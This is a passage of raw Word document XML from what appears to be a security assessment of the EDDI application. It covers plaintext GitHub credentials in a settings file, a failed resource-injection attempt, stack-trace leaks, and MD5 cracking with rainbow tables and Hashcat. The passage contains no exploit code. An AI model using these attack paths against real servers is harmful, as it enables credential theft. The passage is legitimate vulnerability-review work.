        <w:t>This flaw arises from the unencrypted storage of GitHub data in a file, which violates user privacy. In some way, an attacker could gain access to the server on which the application is running by exploiting another vulnerability in the EDDI application (e.g. Remote Code Execution – RCE), a vulnerability in the web server hosting EDDI (e.g. Apache or Nginx), a vulnerability in the server's operating system, compromised server login credentials (e.g. SSH or RDP), physical access to the server or an insider with legitimate access but malicious intent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6A12AB" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Once they have gained access to the file system, they navigate to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.getProperty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>user.dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>") + "/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>gitsettings</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/" directory (e.g. </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/opt/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>eddi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>gitsettings</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>settings.properties</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> file is located there.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEB2812" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Opening this file in a text editor will reveal information such as:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545D3EA9" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.branch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=main  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A0DB63" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">git.commiter_email=user@example.com  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BF4979" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.commiter</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=EDDI Bot  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA3C2F3" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=THE_REAL_PASSWORD  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C97FDF" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git_username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB2AA7F" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.repository</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=https://github.com/you/repo.git  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDA0DC5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.description</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=Backup settings  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A2A94C" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>git.isautomatic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0417D1E8" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Once the attacker has access to this file, they can steal the victim's passwords and usernames and use them to authenticate with their GitHub profile, potentially causing significant damage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15985896" w14:textId="77777777" w:rsidR="00B141FC" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Moreover, storing passwords in plain text within a file located in the user’s working directory (typically under the home folder of the user running the application) significantly increases the risk of exposure. This directory is often accessible to any process or user account with basic access privileges to the host system, meaning even non-root users could potentially read the file. This practice violates basic principles of secure credential management, which require secrets to be encrypted and stored in secure, access-controlled locations (e.g. environment variables, key vaults, or system credential stores).</w:t>
      </w:r>
      <w:r w:rsidR="00B141FC">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E8DB9F" w14:textId="43B86F73" w:rsidR="00910649" w:rsidRPr="008729A0" w:rsidRDefault="0020709D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="89" w:author="{7B908C92-3051-4C76-8213-121A9B8A83E6}" w:date="2025-06-04T19:36:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Moreover, storing passwords in plain text within a file located in the user’s working directory (typically under the home folder of the user running the application) significantly increases the risk of exposure. This directory is often accessible to any process or user account with basic access privileges to the host system, meaning even non-root users could potentially read the file. This practice violates basic principles of secure credential management, which require secrets to be encrypted and stored in secure, access-controlled locations (e.g. environment variables, key vaults, or system credential stores).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7CAC6C53" w14:textId="5AA21EC2" w:rsidR="00910649" w:rsidRPr="008729A0" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="90" w:name="_Toc200039299"/>
      <w:r w:rsidRPr="008729A0">
        <w:t>Resource Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="90"/>
    </w:p>
    <w:p w14:paraId="3A1AB99D" w14:textId="09FA4EE9" w:rsidR="7EBD873A" w:rsidRPr="00725916" w:rsidRDefault="7EBD873A" w:rsidP="0A8760BD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Initial exploitation attempts only resulted in an </w:t>
      </w:r>
      <w:r w:rsidRPr="21B119F5">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Internal Server Error</w:t>
      </w:r>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (HTTP 500) response, indicating that the application accepted the input but could not process it correctly. This makes suspect that, although the parsed parameter is processed server-side, it is protected by a control or validation mechanism that prevents the attack from being executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68051F33" w14:textId="678E7FE6" w:rsidR="7EBD873A" w:rsidRDefault="7EBD873A" w:rsidP="0A8760BD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F839C0">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The main obstacle to exploiting this vulnerability practically is that strict controls are in place over the bot ID, which is passed as a parameter in the URL or request body </w:t>
      </w:r>
      <w:r w:rsidRPr="00F839C0">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>and must conform to a well-defined format: a 24-character hexadecimal string. This restriction hinders attempts to tamper with the parameter using random or malicious input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45251D26" w14:textId="7C8FAE76" w:rsidR="7EBD873A" w:rsidRDefault="7EBD873A" w:rsidP="0A8760BD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">However, it is </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>theorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that, by using advanced encoding techniques such as URL encoding, Unicode encoding or double encoding, it may be possible to construct a request that bypasses the ID format validation and injects a value that points to a different resource. This could lead to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> access to or modification of resources, or even server-side code or command injection, depending on the application's </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the context in which the parameter is used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B416D66" w14:textId="400DC72B" w:rsidR="7EBD873A" w:rsidRDefault="7EBD873A" w:rsidP="0A8760BD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">To verify the presence and scope of the vulnerability further, a </w:t>
      </w:r>
      <w:r w:rsidRPr="3014559B">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>larger test campaign</w:t>
      </w:r>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> would have to be conducted on a larger number of endpoints, submitting parameter variations to different encoding and manipulation techniques. Only in this manner will it be possible to determine whether real weaknesses exist in the validation mechanism or whether the observed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0A8760BD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be explained by generic error handling.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434300D7" w14:textId="1882EB7F" w:rsidR="00910649" w:rsidRPr="005160E2" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="91" w:name="_Toc200039300"/>
      <w:r w:rsidRPr="005160E2">
        <w:t>System Information Leak</w:t>
      </w:r>
      <w:bookmarkEnd w:id="91"/>
    </w:p>
    <w:p w14:paraId="378EA26D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>printStackTrace</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> function automatically writes all the exception trace to the standard stream (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.err</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), including the names of classes, methods, packages and file paths in the file system. If someone reads these logs or has access to the server console, they can obtain internal details about the infrastructure, such as class names, paths and stack traces. This information is useful for preparing a targeted attack. The call to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.printStackTrace</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> itself is not an attack vector, but it makes it much easier to gather useful information for an attack. For example, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> reveals packages and classes, shows absolute paths and file names, and exposes internal logic (lines of code and control flows) that attackers can exploit to find injection points or missing validation </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviours</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. It also facilitates social engineering on those who have access to the logs (e.g. operators and system administrators).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D01150" w14:textId="0DFA3864" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="_Toc200039301"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>System Information Leak: Internal</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="769D0D3C" w14:textId="117274A5" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To exploit this type of vulnerability, you could follow the same approach as in the previous case, but apply it to the different functions that print information about exceptions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49807255" w14:textId="62A5B77F" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="93" w:name="_Toc200039302"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Weak Cryptographic Hash</w:t>
      </w:r>
      <w:bookmarkEnd w:id="93"/>
    </w:p>
    <w:p w14:paraId="243FE1B0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>No exploitation is possible because it isn’t a vulnerability issue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C44ABEA" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>However, there are various methods of stealing encrypted data using MD5. For example, suppose an attacker manages to access the site's database. At this point, they could carry out two different types of attack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE5CFB5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Using rainbow tables. Rainbow tables are huge pre-computed lists that link common passwords to their MD5 hashes. Huge databases of these hashes exist online. The attacker can simply look up the hash on sites such as </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crackstation.net</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>md5decrypt.net</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E900F1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The attacker could also use a dictionary or brute force. If the password is not in the public domain, the attacker can use tools such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hashcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>John the Ripper</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, which can try millions of combinations per second. With a good dictionary, such as the famous rockyou.txt file, they can discover common passwords such as: '123456', 'password', or 'qwerty'. MD5 is so fast that it can check millions of passwords in a few minutes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7FB9DC" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
